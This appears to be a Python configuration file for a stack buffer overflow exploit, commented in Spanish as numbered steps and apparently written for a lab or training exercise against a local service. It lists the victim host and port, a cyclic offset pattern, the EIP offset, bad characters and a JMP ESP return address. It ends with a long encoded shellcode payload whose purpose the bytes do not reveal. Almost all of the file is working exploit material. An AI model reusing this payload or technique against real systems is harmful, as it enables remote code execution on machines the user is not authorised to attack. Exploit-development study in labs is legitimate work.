# PASO I
# ip máquina victima
rhost = '127.0.0.1'

# puerto máquina victima
rport = 8888

# timeout conexión en segundos
timeout = 10

# PASO II
# pattern
pattern = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu'

# PASO III
# offset EIP
offsetEIP = 1052

# offset ESP
offsetESP = offsetEIP + 4

# tamaño máximo del relleno del padding final
buffer = 2000

# PASO IV
badchars = [0x00] # badchars = [0x00, 0x0a, 0x0d]
badcharsSequence = bytes(c for c in range(256) if c not in badchars)

# PASO V
# dirección de la operación jmp ESP
jmpESP = 0x68A98A7B # jmpESP = 0x11223344

# PASO VI
# subir ESP en la pila (stack)
upESP = b'\x83\xec\x10'
#upESP = b'\x90' * 16

# shellcode
shellcode =  b""
shellcode += b"\xd9\xc2\xbd\xf2\x23\xa8\xca\xd9\x74\x24\xf4"
shellcode += b"\x5a\x29\xc9\xb1\x52\x31\x6a\x17\x03\x6a\x17"
shellcode += b"\x83\x18\xdf\x4a\x3f\x20\xc8\x09\xc0\xd8\x09"
shellcode += b"\x6e\x48\x3d\x38\xae\x2e\x36\x6b\x1e\x24\x1a"
shellcode += b"\x80\xd5\x68\x8e\x13\x9b\xa4\xa1\x94\x16\x93"
shellcode += b"\x8c\x25\x0a\xe7\x8f\xa5\x51\x34\x6f\x97\x99"
shellcode += b"\x49\x6e\xd0\xc4\xa0\x22\x89\x83\x17\xd2\xbe"
shellcode += b"\xde\xab\x59\x8c\xcf\xab\xbe\x45\xf1\x9a\x11"
shellcode += b"\xdd\xa8\x3c\x90\x32\xc1\x74\x8a\x57\xec\xcf"
shellcode += b"\x21\xa3\x9a\xd1\xe3\xfd\x63\x7d\xca\x31\x96"
shellcode += b"\x7f\x0b\xf5\x49\x0a\x65\x05\xf7\x0d\xb2\x77"
shellcode += b"\x23\x9b\x20\xdf\xa0\x3b\x8c\xe1\x65\xdd\x47"
shellcode += b"\xed\xc2\xa9\x0f\xf2\xd5\x7e\x24\x0e\x5d\x81"
shellcode += b"\xea\x86\x25\xa6\x2e\xc2\xfe\xc7\x77\xae\x51"
shellcode += b"\xf7\x67\x11\x0d\x5d\xec\xbc\x5a\xec\xaf\xa8"
shellcode += b"\xaf\xdd\x4f\x29\xb8\x56\x3c\x1b\x67\xcd\xaa"
shellcode += b"\x17\xe0\xcb\x2d\x57\xdb\xac\xa1\xa6\xe4\xcc"
shellcode += b"\xe8\x6c\xb0\x9c\x82\x45\xb9\x76\x52\x69\x6c"
shellcode += b"\xd8\x02\xc5\xdf\x99\xf2\xa5\x8f\x71\x18\x2a"
shellcode += b"\xef\x62\x23\xe0\x98\x09\xde\x63\xad\xc7\xee"
shellcode += b"\x70\xd9\xd5\xee\x71\xfd\x53\x08\x17\xed\x35"
shellcode += b"\x83\x80\x94\x1f\x5f\x30\x58\x8a\x1a\x72\xd2"
shellcode += b"\x39\xdb\x3d\x13\x37\xcf\xaa\xd3\x02\xad\x7d"
shellcode += b"\xeb\xb8\xd9\xe2\x7e\x27\x19\x6c\x63\xf0\x4e"
shellcode += b"\x39\x55\x09\x1a\xd7\xcc\xa3\x38\x2a\x88\x8c"
shellcode += b"\xf8\xf1\x69\x12\x01\x77\xd5\x30\x11\x41\xd6"
shellcode += b"\x7c\x45\x1d\x81\x2a\x33\xdb\x7b\x9d\xed\xb5"
shellcode += b"\xd0\x77\x79\x43\x1b\x48\xff\x4c\x76\x3e\x1f"
shellcode += b"\xfc\x2f\x07\x20\x31\xb8\x8f\x59\x2f\x58\x6f"
shellcode += b"\xb0\xeb\x78\x92\x10\x06\x11\x0b\xf1\xab\x7c"
shellcode += b"\xac\x2c\xef\x78\x2f\xc4\x90\x7e\x2f\xad\x95"
shellcode += b"\x3b\xf7\x5e\xe4\x54\x92\x60\x5b\x54\xb7"